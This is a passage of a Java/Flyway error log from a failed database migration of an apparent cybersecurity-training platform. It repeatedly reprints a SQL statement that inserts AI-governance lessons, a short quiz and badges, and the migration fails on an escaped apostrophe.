    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: syntax error at or near "s"
  Position: 788
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:24:47.113 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: syntax error at or near "s"
  Position: 788
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:24:47.127 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
